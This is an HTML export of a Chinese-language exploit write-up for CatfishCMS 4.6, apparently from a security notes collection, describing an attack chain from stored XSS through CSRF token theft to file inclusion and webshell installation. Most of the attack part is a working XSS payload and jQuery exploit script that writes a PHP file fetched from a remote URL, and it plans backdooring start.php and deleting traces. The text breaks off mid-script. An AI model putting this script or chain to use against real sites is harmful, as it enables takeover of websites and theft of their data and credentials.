<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="catfishcms-4615-csrf-getshell"><span class="csDE05BCC">CatfishCMS 4.6.15 csrf getshell</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">在测试的过程中发现更新版本的时候作者添加一个参数</span><span class="cs8926E06"> verification </span><span class="cs9C1B1871">可能是用来防治</span><span class="cs8926E06">csrf</span><span class="cs9C1B1871">。嗯，不得不说，作者安全意识提高了，用来防治</span><span class="cs8926E06">csrf</span><span class="cs9C1B1871">这的却是一个好思路，但是对于我们可以执行</span><span class="cs8926E06">xss</span><span class="cs9C1B1871">来说，</span><span class="cs8926E06">verification </span><span class="cs9C1B1871">就显的苍白无力了，因为我们可以先获取</span><span class="cs8926E06"><br/>verification </span><span class="cs9C1B1871">然后在执行</span><span class="cs8926E06">csrf </span><span class="cs9C1B1871">从而来绕过。</span></p><h2 class="cs868C439D">
			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">CatfishCMS 4.6</span></p><h2 class="cs868C439D">
			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<h3 class="cs868C439D">
			<a name="漏洞分析"><span class="csD6CA00D2">漏洞分析</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">文件：</span><span class="cs8926E06">CatfishCMS-4.6.12\catfish\library\think\Template.php</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">函数：</span><span class="cs8926E06">fetch()</span></p><p class="cs40DD2BC9"><span><img src="Web安全/CatfishCMS/CatfishCMS%204.6.15%20csrf%20getshell_files/image0.png" width="560" height="347" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span><img src="Web安全/CatfishCMS/CatfishCMS%204.6.15%20csrf%20getshell_files/image1.png" width="560" height="409" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span><img src="Web安全/CatfishCMS/CatfishCMS%204.6.15%20csrf%20getshell_files/image2.png" width="560" height="309" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span><img src="Web安全/CatfishCMS/CatfishCMS%204.6.15%20csrf%20getshell_files/image3.png" width="560" height="123" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span><img src="Web安全/CatfishCMS/CatfishCMS%204.6.15%20csrf%20getshell_files/image4.png" width="560" height="368" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span><img src="Web安全/CatfishCMS/CatfishCMS%204.6.15%20csrf%20getshell_files/image5.png" width="560" height="300" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">嗯，说完了。</span><span class="cs8926E06">Fetch</span><span class="cs9C1B1871">方法最后都会编译文件以后通过</span><span class="cs8926E06">PHP</span><span class="cs9C1B1871">输出，所以如果我们可以在他编译之前写入</span><span class="cs8926E06"><br/></span><span class="cs9C1B1871">恶意代码</span><span class="cs8926E06"> </span><span class="cs9C1B1871">那么就可以为所欲为。</span></p><h3 class="cs868C439D">
			<a name="复现"><span class="csD6CA00D2">复现</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">前台注册一个账户</span><span class="cs8926E06">-&gt;</span><span class="cs9C1B1871">注册一个图片马到网站中</span><span class="cs8926E06">-&gt;</span><span class="cs9C1B1871">评论处插入</span><span class="cs8926E06">xss</span><span class="cs9C1B1871">代码</span><span class="cs8926E06">-&gt;</span><span class="cs9C1B1871">等待无辜管理员登录网站</span><span class="cs8926E06">-&gt;</span><span class="cs9C1B1871">获取</span><span class="cs8926E06"> verification(</span><span class="cs9C1B1871">绕过检测</span><span class="cs8926E06">)-&gt;</span><span class="cs9C1B1871">管理员入口</span><span class="cs8926E06">-</span><span class="cs9C1B1871">页面管理</span><span class="cs8926E06">-</span><span class="cs9C1B1871">新建页面</span><span class="cs8926E06">-csrf</span><span class="cs9C1B1871">插入一条非法语句引起包含漏洞</span><span class="cs8926E06">(</span><span class="cs9C1B1871">用来包含前面的图片马</span><span class="cs8926E06">)-&gt;</span><span class="cs9C1B1871">包含漏洞执行代码</span><span class="cs8926E06">-&gt;</span><span class="cs9C1B1871">包含漏洞添加</span><span class="cs8926E06">getshell_code.php</span><span class="cs9C1B1871">文件写入恶意代码</span><span class="cs8926E06">-&gt;</span><span class="cs9C1B1871">包含漏洞</span><span class="cs8926E06">-</span><span class="cs9C1B1871">将框架文件</span><span class="cs8926E06">start.php</span><span class="cs9C1B1871">添加一句话木马</span><span class="cs8926E06">-</span><span class="cs9C1B1871">包含数据库配置文件</span><span class="cs8926E06">-</span><span class="cs9C1B1871">连接数据库</span><span class="cs8926E06">-&gt;</span><span class="cs9C1B1871">删除我们前面的评论</span><span class="cs8926E06">-&gt;</span><span class="cs9C1B1871">删除我们</span><span class="cs8926E06">csrf</span><span class="cs9C1B1871">创建的页面</span><span class="cs8926E06">-&gt;</span><span class="cs9C1B1871">邮件通知我们</span><span class="cs8926E06">-&gt;getshell</span></p><p class="cs40DD2BC9"><span class="cs8926E06">CatfishCMS-4.6.12-xss.js</span></p><p class="cs3A447A38"><span class="cs9FB05234">/* &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;</span><span class="cs7FFD2630">需要插入的</span><span class="cs9FB05234">xss</span><span class="cs7FFD2630">代码</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&lt;img src=&quot;#&quot; alt=&quot;xss_csrf_getshll&quot; onerror=&quot;var url = &#39;http://127.0.0.1/cms/CatfishCMS-4.6.12/xss-js/CatfishCMS-4.6.12-xss.js&#39;;xss_js = &#39;&lt;scr&#39;+&#39;ipt src=&#39;+url+&#39;&gt;&lt;\/sc&#39;+&#39;ript&gt;&#39;;$(&#39;body&#39;).append(xss_js);&quot;&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">*/ </span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">//</span><span class="cs7FFD2630">不用动的</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">var articles = &#39;index.php/admin/Index/articles.html&#39;;//</span><span class="cs7FFD2630">用来获取</span><span class="cs9FB05234"> verification </span><span class="cs7FFD2630">绕过检测</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">var newpage = &#39;index.php/admin/Index/newpage.html&#39;;//</span><span class="cs7FFD2630">生成文章地址</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">var allpage = &#39;index.php/admin/Index/allpage.html&#39;;//</span><span class="cs7FFD2630">获取文章链接</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">//</span><span class="cs7FFD2630">需要改的</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">var url = &#39;http://0-sec.org&#39;;//</span><span class="cs7FFD2630">你要日的站的域名</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">var directory = &#39;/cms/CatfishCMS-4.6.12/&#39;; //</span><span class="cs7FFD2630">日的站的额外目录一般为空即可</span><span class="cs9FB05234">(</span><span class="cs7FFD2630">站点设置二级目录时，此目录要填写</span><span class="cs9FB05234">)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">var img_trojan_url = &#39;../../../&#39;+&#39;data/uploads/20171201/2c8b7c7f1d49faeb5321ce0c9b1962af.jpg&#39;;//</span><span class="cs7FFD2630">图片马的地址</span><span class="cs9FB05234"> </span><span class="cs7FFD2630">修改</span><span class="cs9FB05234"> + </span><span class="cs7FFD2630">号后面的即可</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">var getshell_code = &#39;http://127.0.0.1/cms/CatfishCMS-4.6.12/xss-js/getshell_code.txt&#39;;//</span><span class="cs7FFD2630">恶意代码远程包含的地址</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">$(&#39;body&#39;).append(&#39;&lt;div id=&quot;csrf_verification&quot; style=&quot;display:none;&quot;&gt;&lt;/div&gt;&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$(&#39;body&#39;).append(&#39;&lt;div id=&quot;csrf_allpage&quot; style=&quot;display:none;&quot;&gt;&lt;/div&gt;&#39;);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">$.ajax({</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;url: url+directory+articles,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;dataType: &quot;json&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;success: function(verification_content){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$(&#39;#csrf_verification&#39;).append(verification_content);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var verification = $(&#39;#verification&#39;).html();//</span><span class="cs7FFD2630">用来绕过验证的</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// alert(verification);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//csrf</span><span class="cs7FFD2630">生成文章</span><span class="cs9FB05234">,</span><span class="cs7FFD2630">引起文件包含漏洞</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$.ajax({</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;type: &quot;POST&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;url: url+directory+newpage,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;data: {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;biaoti&#39;:&#39;xss_csrf_getshll&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;template&#39;:img_trojan_url,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;verification&#39;:verification,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;fabushijian&#39;:&#39;2017-12-05 11:56:48&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;},</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;success: function(){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//csrf</span><span class="cs7FFD2630">获取</span><span class="cs9FB05234">shell</span><span class="cs7FFD2630">链接</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$.ajax({</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;type: &quot;POST&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;url: url+directory+allpage,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;success: function(allpage_content){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$(&#39;#csrf_allpage&#39;).append(allpage_content);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var shell_id = $(&#39;#csrf_allpage .table-responsive .table-bordered tbody tr td .gouxuan&#39;).eq(0).val();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var shell_url = $(&#39;#csrf_allpage .table-responsive .table-bordered tbody tr td a&#39;).eq(0).attr(&#39;href&#39;);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var shell_content = &#39;&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;shell_content+= &quot;$myfile = fopen(&#39;getshell_code.php&#39;, &#39;w&#39;);&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;shell_content+= &#39;$txt = &#39;+&#39;file_get_contents(&quot;&#39;+getshell_code+&#39;&quot;);&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;shell_content+= &#39;fwrite($myfile, $txt);&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.log(shell_content);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//</span><span class="cs7FFD2630">执行</span><span class="cs9FB05234">shell </span><span class="cs7FFD2630">生成马子</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$.ajax({</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;type: &quot;POST&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;url: url+shell_url,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dataType: &quot;json&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;data: {&#39;ddd&#39;:shell_content},</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;success: function(data){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$.ajax({</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;type: &quot;GET&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;url: url+directory+&#39;getshell_code.php&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dataType: &quot;json&quot;, </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// data: {&#39;zzz&#39;:1}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;});</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;},</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;error: function(){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$.ajax({</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;type: &quot;GET&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;url: url+directory+&#39;getshell_code.php&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dataType: &quot;json&quot;, </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// data: {&#39;zzz&#39;:1}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;});</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} &nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;});</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;});</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> 